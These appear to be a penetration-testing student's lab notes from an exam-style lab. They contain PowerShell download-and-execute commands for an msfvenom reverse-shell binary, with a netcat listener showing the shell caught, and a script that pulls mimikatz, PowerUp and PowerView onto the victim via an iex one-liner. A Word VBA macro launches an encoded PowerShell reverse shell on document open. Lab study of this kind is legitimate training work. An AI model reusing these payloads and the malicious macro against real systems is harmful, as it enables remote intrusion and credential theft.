Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell_7680.exe

# DID WORK DID WORK DID WORK
iwr -uri 192.168.45.238/shell_7680.exe -OutFile shell_7680.exe

```

```powershell

# how to upload and execute files in powershell - in this case got a msfvenom reverse shell

# DID WORK DID WORK DID WORK
# used to invoke and write shell to victim machine
iwr -uri 192.168.45.238/shell_7680.exe -OutFile shell_7680.exe

# used to start the process
PS C:\Windows\tasks> Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell_7680.exe
PS C:\Windows\tasks> 

# proof that the reverse shell was caught.
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 7680
listening on [any] 7680 ...
connect to [192.168.45.238] from (UNKNOWN) [10.11.1.22] 49763
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\tasks>whoami
whoami
svcorp\alice

C:\Windows\tasks>    

```
![[7 PS GOLDEN STANDARD UPLOAD FILES AND EXECUTE.png]]


```powershell
# created pwn.ps1 in /home/kali/Documents/www/pwn.ps1 to pull mimikatz/powerup/powerview onto victim machine in one swoop

gedit pwn.ps1

$baseURL= "http://192.168.45.238/" # change ip
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest - Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"


#command to executepwn.ps1
iex (iwr -uri 192.168.119.139/pwn.ps1 -usebasicparsing)


```

```
# dropped from connection need to reset box to get back on.., so dumb, ip address randomly changed??????
need to change macro.....


new ip address 192.168.45.5

#notnew.doc on windows, resaved as newnewnew.doc on linux

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
	Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
	Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
	Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
	Str = Str + "MQA5ADIALgAxADYAOAAuADQANQAuADUAIgAsADEAMgAzADQAKQ"
	Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
	Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
	Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
	Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
	Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
	Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
	Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
	Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
	Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
	Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
	Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
	Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
	Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
	Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
	Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
	Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
	Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
	Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
	Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
	Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
	Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
	Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
	Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

    CreateObject("Wscript.Shell").Run Str
End Sub
```

# quitting due to tun0 ip keep changing and it being a bitch and a half to setup the macro. I'll review my notes but i refuse to do this box because its so ass.